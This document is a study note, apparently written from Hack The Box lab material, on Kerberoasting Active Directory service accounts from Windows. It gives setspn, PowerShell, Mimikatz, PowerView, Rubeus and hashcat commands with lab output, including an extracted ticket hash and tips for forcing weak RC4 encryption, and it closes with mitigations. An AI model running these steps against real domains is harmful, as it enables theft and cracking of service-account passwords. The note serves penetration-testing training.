Kerberoasting - from Windows
#############################

Date: 2024-12-26 11:42:19

Status: #new

Tags: :ref:`active directory enumeration attacks`

Description
*************

:ref:`kerberoasting - from linux`


Kerberoasting - **Semi Manual method**
****************************************

This method has been depreciated for more automated modern tools, but worth mentioning in case these tools are not available, 
and worth mentioning to see what happens behind the scenes. 

.. code-block:: console

    C:\htb> setspn.exe -Q */*

    Checking domain DC=INLANEFREIGHT,DC=LOCAL
    CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
            exchangeAB/ACADEMY-EA-DC01
            exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
            TERMSRV/ACADEMY-EA-DC01
            TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
            Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
            ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
            ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL

    <SNIP>

    CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            backupjob/veam001.inlanefreight.local
    CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            sts/inlanefreight.local

    <SNIP>


    CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            MSSQLSvc/SPSJDB.inlanefreight.local:1433
    CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
    CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
    CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            adfsconnect/azure01.inlanefreight.local

    Existing SPN found!

By using PowerShell, we can request TGS tickets for an account in the shell above and 
load them into memory. Once they are loaded into memory, we can extract them using Mimikatz.

Let's try this by targeting a single user:

Targeting a Single User
************************

.. code-block:: powershell

    PS C:\htb> Add-Type -AssemblyName System.IdentityModel
    PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

    Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 2/24/2022 11:36:22 PM
    ValidTo              : 2/25/2022 8:55:25 AM
    ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Retrieving All Tickets Using setspn.exe
****************************************

.. code-block:: powershell

    PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

    Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 2/24/2022 11:56:18 PM
    ValidTo              : 2/25/2022 8:55:25 AM
    ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

    Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 2/24/2022 11:56:18 PM
    ValidTo              : 2/24/2022 11:58:18 PM
    ServicePrincipalName : kadmin/changepw
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

    Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 2/24/2022 11:56:18 PM
    ValidTo              : 2/25/2022 8:55:25 AM
    ServicePrincipalName : WSMAN/ACADEMY-EA-MS01
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

    <SNIP>

Extracting Tickets from memory with :ref:`mimikatz`
******************************************************

In this example we are asking :ref:`mimikatz` to output as Base64, this makes copy paste the hash back to your workstation easier ( in the case 
of restricted file transferring).  If you are able to transfer the file, skip the encoding and just export the file as is and skip the `base64 /out:true`


Step 1:  Get the hash from memory

.. code-block:: console

        Using 'mimikatz.log' for logfile : OK

        mimikatz # base64 /out:true
        isBase64InterceptInput  is false
        isBase64InterceptOutput is true

        mimikatz # kerberos::list /export  

        <SNIP>

        [00000002] - 0x00000017 - rc4_hmac_nt      
        Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
        Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
        Client Name       : htb-student @ INLANEFREIGHT.LOCAL
        Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
        ====================
        Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
        ====================
        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
        ZWZyZWlnaHQubG9jYWw6MTQzMw==
        ====================

        * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi

        <SNIP>


Step 2: Preparing the base64 blob for cracking
*************************************************

.. code-block:: bash

        Temen@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 

You can also decode and place the output into a .kirbi file with:

.. console-block:: bash

        Temen@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi

There is a utility (:doc:`https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py`) 
that allows you to extract the password hash called kirbi2john.py 

Step 3: convert the file 

.. code-block:: bash

        Temen@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi

To use this file with :ref:`hashcat` it must be modified.

Step 4: prepare the file

.. code-block:: bash

        Temen@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

step 5: Now the hash can be cracked with :ref:`hashcat`

.. code-block:: bash

        Temen@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 




Kerberoasting - **Semi-auto method**
****************************************

This method is performed on the Windows host, and the host requires access to:

- :ref:`powerview`


Extract TGS tickets with :ref:`powerview`
===================================================

Listing accounts that hashes can be extracted

.. code-block:: powershell

        PS C:\htb> Import-Module .\PowerView.ps1
        PS C:\htb> Get-DomainUser * -spn | select samaccountname


Using :ref:`powerview` to target a specific user

.. code-block:: powershell

        PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

Using :ref:`powerview` to export all tickets for offline cracking

.. code-block:: powershell

        PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

Using :ref:`rubeus` to target kerberos
=======================================

This approach is modern, and many tasks below are automated. 

- Performing Kerberoasting and outputting hashes to a file
- Using alternate credentials
- Performing Kerberoasting combined with a pass-the-ticket attack
- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES Kerberoasting

To get stats of the current state of the Kerberos implementation you can use the following:

.. code-block:: powershell

        PS C:\htb> .\Rubeus.exe kerberoast /stats

         ______        _
        (_____ \      | |
        _____) )_   _| |__  _____ _   _  ___
        |  __  /| | | |  _ \| ___ | | | |/___)
        | |  \ \| |_| | |_) ) ____| |_| |___ |
        |_|   |_|____/|____/|_____)____/(___/

        v2.0.2


        [*] Action: Kerberoasting

        [*] Listing statistics about target users, no ticket requests being performed.
        [*] Target Domain          : INLANEFREIGHT.LOCAL
        [*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

        [*] Total kerberoastable users : 9


        ------------------------------------------------------------
        | Supported Encryption Type                        | Count |
        ------------------------------------------------------------
        | RC4_HMAC_DEFAULT                                 | 7     |
        | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
        ------------------------------------------------------------

        ----------------------------------
        | Password Last Set Year | Count |
        ----------------------------------
        | 2022                   | 9     |
        ----------------------------------

Example 1:  Looking for high value targets:
==============================================

.. code-block:: powershell

        PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

        ______        _
        (_____ \      | |
        _____) )_   _| |__  _____ _   _  ___
        |  __  /| | | |  _ \| ___ | | | |/___)
        | |  \ \| |_| | |_) ) ____| |_| |___ |
        |_|   |_|____/|____/|_____)____/(___/

        v2.0.2


        [*] Action: Kerberoasting

        [*] NOTICE: AES hashes will be returned for AES-enabled accounts.
        [*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

        [*] Target Domain          : INLANEFREIGHT.LOCAL
        [*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'

        [*] Total kerberoastable users : 3


        [*] SamAccountName         : backupagent
        [*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        [*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local
        [*] PwdLastSet             : 2/15/2022 2:15:40 PM
        [*] Supported ETypes       : RC4_HMAC_DEFAULT
        [*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*$750F377DEFA85A67EA0FE51B0B28F83D$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266827E2BE2A151EC5845DCC59DA1A39C1BA3784BA8502A4340A90AB1F8D4869318FB0B2BEC2C8B6C688BD78BBF6D58B1E0A0B980826842165B0D88EAB7009353ACC9AD4FE32811101020456356360408BAD166B86DBE6AEB3909DEAE597F8C41A9E4148BD80CFF65A4C04666A977720B954610952AC19EDF32D73B760315FA64ED301947142438B8BCD4D457976987C3809C3320725A708D83151BA0BFF651DFD7168001F0B095B953CBC5FC3563656DF68B61199D04E8DC5AB34249F4583C25AC48FF182AB97D0BF1DE0ED02C286B42C8DF29DA23995DEF13398ACBE821221E8B914F66399CB8A525078110B38D9CC466EE9C7F52B1E54E1E23B48875E4E4F1D35AEA9FBB1ABF1CF1998304A8D90909173C25AE4C466C43886A650A460CE58205FE3572C2BF3C8E39E965D6FD98BF1B8B5D09339CBD49211375AE612978325C7A793EC8ECE71AA34FFEE9BF9BBB2B432ACBDA6777279C3B93D22E83C7D7DCA6ABB46E8CDE1B8E12FE8DECCD48EC5AEA0219DE26C222C808D5ACD2B6BAA35CBFFCD260AE05EFD347EC48213F7BC7BA567FD229A121C4309941AE5A04A183FA1B0914ED532E24344B1F4435EA46C3C72C68274944C4C6D4411E184DF3FE25D49FB5B85F5653AD00D46E291325C5835003C79656B2D85D092DFD83EED3ABA15CE3FD3B0FB2CF7F7DFF265C66004B634B3C5ABFB55421F563FFFC1ADA35DD3CB22063C9DDC163FD101BA03350F3110DD5CAFD6038585B45AC1D482559C7A9E3E690F23DDE5C343C3217707E4E184886D59C677252C04AB3A3FB0D3DD3C3767BE3AE9038D1C48773F986BFEBFA8F38D97B2950F915F536E16E65E2BF67AF6F4402A4A862ED09630A8B9BA4F5B2ACCE568514FDDF90E155E07A5813948ED00676817FC9971759A30654460C5DF4605EE5A92D9DDD3769F83D766898AC5FC7885B6685F36D3E2C07C6B9B2414C11900FAA3344E4F7F7CA4BF7C76A34F01E508BC2C1E6FF0D63AACD869BFAB712E1E654C4823445C6BA447463D48C573F50C542701C68D7DBEEE60C1CFD437EE87CE86149CDC44872589E45B7F9EB68D8E02070E06D8CB8270699D9F6EEDDF45F522E9DBED6D459915420BBCF4EA15FE81EEC162311DB8F581C3C2005600A3C0BC3E16A5BEF00EEA13B97DF8CFD7DF57E43B019AF341E54159123FCEDA80774D9C091F22F95310EA60165C805FED3601B33DA2AFC048DEF4CCCD234CFD418437601FA5049F669FEFD07087606BAE01D88137C994E228796A55675520AB252E900C4269B0CCA3ACE8790407980723D8570F244FE01885B471BF5AC3E3626A357D9FF252FF2635567B49E838D34E0169BDD4D3565534197C40072074ACA51DB81B71E31192DB29A710412B859FA55C0F41928529F27A6E67E19BE8A6864F4BC456D3856327A269EF0D1E9B79457E63D0CCFB5862B23037C74B021A0CDCA80B43024A4C89C8B1C622A626DE5FB1F99C9B41749DDAA0B6DF9917E8F7ABDA731044CF0E989A4A062319784D11E2B43554E329887BF7B3AD1F3A10158659BF48F9D364D55F2C8B19408C54737AB1A6DFE92C2BAEA9E


.. note:: Kerberoasting prefers RC4 encryption (type 23) other encryptions are much harder to crack.

.. list-table:: Encryption Types 
        :header-rows: 1
        :align: left 
        :widths: 20 20 60 

        * - type
          - number
          - Description
        * - RC4 
          - type 23
          - The prefered method for Kerberoasting $krb5tgs$23$*
        * - AES-256 
          - type 18
          - $krb5tgs$18$* Difficult to crack
        * - AES-128
          - Type 17
          - $krb5tgs$17$* Difficult to crack

Example 1:  Targeting a user and asking for a weak hash with `/tgtdeleg`

.. code-block:: powershell

        PS C:\htb> .\Rubeus.exe kerberoast  /tgtdeleg /user:testspn /nowrap

.. note::  Requesting a weaker password does not work on a domain controller 2019 or newer, they always default to the strongest level of encryption enabled by that account.

.. note:: If you have the privileges, you can edit the registry and set a lower encryption level. ` Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`
        and double clicking the `Network security: Configure encryption types allowed for Kerberos` and set it to `RC4_HMAC_MD5`


Checking to see what encryption type is enabled
**************************************************

The following command will show which (if any) encryption is enabled.  If it displays 0
then none is defined and will default to RC4_HMAC_MD5. See this https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797
for information on non-0 settings.

.. code-block:: powershell

        PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

        serviceprincipalname                   msds-supportedencryptiontypes samaccountname
        --------------------                   ----------------------------- --------------
        testspn/kerberoast.inlanefreight.local                            0 testspn


Mitigations for Kerberoasting
*********************************

- Setting non-managed service accounts to long complex passwords. 
- Using MSA (https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009)
- Using group management with gMSA (https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- Using :ref:`laps`
- Audit kerberose tickets (https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- Please see this post on detection (https://adsecurity.org/?p=3458)

References
*****************
https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797
https://hashcat.net/wiki/doku.php?id=example_hashes